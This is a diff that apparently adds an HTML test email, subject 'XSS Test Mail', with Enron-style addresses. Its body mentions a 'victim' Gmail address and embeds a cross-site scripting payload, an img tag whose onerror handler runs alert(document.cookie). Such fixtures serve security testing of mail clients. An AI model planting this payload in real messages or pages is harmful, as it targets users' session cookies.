@@ -1,0 +1,7 @@
+From: wenyao.jia@enron.com
+To: j..yanowski@enron.com, greg.piper@enron.com, sally.beck@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
